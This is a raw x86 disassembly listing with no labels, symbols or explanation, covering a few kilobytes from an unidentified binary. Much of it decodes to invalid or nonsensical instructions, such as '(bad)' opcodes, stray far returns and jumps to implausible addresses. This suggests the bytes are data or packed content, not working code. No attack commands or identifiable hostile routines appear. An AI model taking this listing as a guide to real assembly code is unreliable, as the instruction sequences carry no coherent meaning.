  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
